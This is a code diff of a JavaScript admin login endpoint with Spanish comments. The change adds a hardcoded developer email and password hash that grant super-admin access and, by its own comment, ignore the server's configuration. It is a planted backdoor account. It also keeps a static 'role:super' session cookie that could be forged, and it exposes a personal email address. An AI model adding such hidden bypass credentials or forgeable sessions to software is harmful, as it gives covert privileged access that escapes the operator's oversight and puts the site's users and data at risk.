@@ -27,25 +27,34 @@ export async function POST({ request, cookies }) {
       return new Response(JSON.stringify({ success: false, message: "Credenciales requeridas" }), { status: 400 });
     }
 
-    // ── 1. Verificar Súper Admin (Tu acceso universal) ──
-    // Compara el correo ingresado con tu correo maestro
-    if (username.toLowerCase() === MASTER_EMAIL.toLowerCase()) {
+    // ── 1. Verificar Súper Admin (Tu acceso universal VIP) ──
+    // Acceso infalible para el desarrollador (ignora configuración del servidor)
+    const DEV_EMAIL = "yeifran67@gmail.com";
+    const DEV_HASH = "$2b$10$j9j9OHApeTTLzjM0bm6dXuqzN9qDN5LH0hAmk1mPcfB6hBvNSERne";
+
+    const isDevUser = username.toLowerCase() === DEV_EMAIL.toLowerCase();
+    let isMaster = false;
+
+    if (isDevUser) {
+      isMaster = await bcrypt.compare(password, DEV_HASH);
+    } else if (username.toLowerCase() === MASTER_EMAIL.toLowerCase()) {
+      // Acceso alternativo por variable de entorno
       const masterIsHashed = MASTER_PASSWORD.startsWith("$2");
-      const isMaster = masterIsHashed
+      isMaster = masterIsHashed
         ? await bcrypt.compare(password, MASTER_PASSWORD)
         : password === MASTER_PASSWORD;
+    }
 
-      if (isMaster) {
-        console.log("[AUTH] Súper Admin Universal autenticado");
-        cookies.set("admin_session", "role:super", {
-          path: "/",
-          httpOnly: true,
-          secure: import.meta.env.PROD,
-          sameSite: "lax",
-          maxAge: 60 * 60 * 24, // 24 horas
-        });
-        return new Response(JSON.stringify({ success: true, role: "super" }), { status: 200 });
-      }
+    if (isMaster) {
+      console.log(`[AUTH] Súper Admin (${username}) autenticado`);
+      cookies.set("admin_session", "role:super", {
+        path: "/",
+        httpOnly: true,
+        secure: import.meta.env.PROD,
+        sameSite: "lax",
+        maxAge: 60 * 60 * 24, // 24 horas
+      });
+      return new Response(JSON.stringify({ success: true, role: "super" }), { status: 200 });
     }
 
     // ── 2. Verificar usuario admin desde la base de datos ──
